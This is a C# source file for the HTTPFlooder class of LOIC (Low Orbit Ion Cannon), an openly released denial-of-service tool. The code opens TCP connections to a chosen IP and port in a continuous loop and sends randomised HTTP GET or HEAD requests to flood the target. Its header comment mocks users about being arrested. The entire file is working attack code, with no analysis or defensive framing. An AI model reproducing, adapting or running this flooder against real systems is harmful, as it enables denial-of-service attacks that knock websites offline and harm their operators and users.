/* LOIC - Low Orbit Ion Cannon
 * Released to the public domain
 * Enjoy getting v&, kids.
 */

using System;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;

namespace LOIC
{
	public class HTTPFlooder : cHLDos
	{
		private BackgroundWorker bw;
		private Timer tTimepoll;
		private bool intShowStats;
		private long lastAction;

		private readonly string Host;
		private readonly string IP;
		private readonly int Port;
		private readonly string Subsite;
		private readonly bool Resp;
		private readonly bool Random;
		private readonly bool UseGet;
		private readonly bool AllowGzip;

		public HTTPFlooder(string host, string ip, int port, string subSite, bool resp, int delay, int timeout, bool random, bool useget, bool gzip)
		{
			this.Host = (host == "") ? ip : host;
			this.IP = ip;
			this.Port = port;
			this.Subsite = subSite;
			this.Resp = resp;
			this.Delay = delay;
			this.Timeout = timeout * 1000;
			this.Random = random;
			this.UseGet = useget;
			this.AllowGzip = gzip;
		}
		public override void Start()
		{
			this.IsFlooding = true;

			lastAction = Tick();
			tTimepoll = new Timer();
			tTimepoll.Tick += tTimepoll_Tick;
			tTimepoll.Start();

			this.bw = new BackgroundWorker();
			this.bw.DoWork += bw_DoWork;
			this.bw.RunWorkerAsync();
			this.bw.WorkerSupportsCancellation = true;
		}
		public override void Stop()
		{
			this.IsFlooding = false;
			this.bw.CancelAsync();
		}
		private void tTimepoll_Tick(object sender, EventArgs e)
		{
			// Protect against race condition
			if(intShowStats) return; intShowStats = true;

			if(Tick() > lastAction + Timeout)
			{
				Failed++; State = ReqState.Failed;
				tTimepoll.Stop();
				if(this.IsFlooding)
					tTimepoll.Start();
			}

			intShowStats = false;
		}
		private void bw_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(IP), Port);
				while (this.IsFlooding)
				{
					State = ReqState.Ready; // SET STATE TO READY //
					lastAction = Tick();
					byte[] recvBuf = new byte[128];
					using (Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
					{
						socket.NoDelay = true;
						State = ReqState.Connecting; // SET STATE TO CONNECTING //

						try { socket.Connect(RHost); }
						catch(SocketException) { goto _continue; }

						byte[] buf = Functions.RandomHttpHeader((UseGet ? "GET" : "HEAD"), Subsite, Host, Random, AllowGzip);

						socket.Blocking = Resp;
						State = ReqState.Requesting; // SET STATE TO REQUESTING //

						try
						{
							socket.Send(buf, SocketFlags.None);
							State = ReqState.Downloading; Requested++; // SET STATE TO DOWNLOADING // REQUESTED++

							if (Resp)
							{
								socket.ReceiveTimeout = Timeout;
								socket.Receive(recvBuf, recvBuf.Length, SocketFlags.None);
							}
						}
						catch(SocketException) { goto _continue; }
					}
					State = ReqState.Completed; Downloaded++; // SET STATE TO COMPLETED // DOWNLOADED++
					tTimepoll.Stop();
					tTimepoll.Start();
_continue:
					if(Delay >= 0)
						System.Threading.Thread.Sleep(Delay+1);
				}
			}
			// Analysis disable once EmptyGeneralCatchClause
			catch { }
			finally { tTimepoll.Stop(); State = ReqState.Ready; this.IsFlooding = false; }
		}
		private static long Tick()
		{
			return DateTime.UtcNow.Ticks / 10000;
		}
	}
}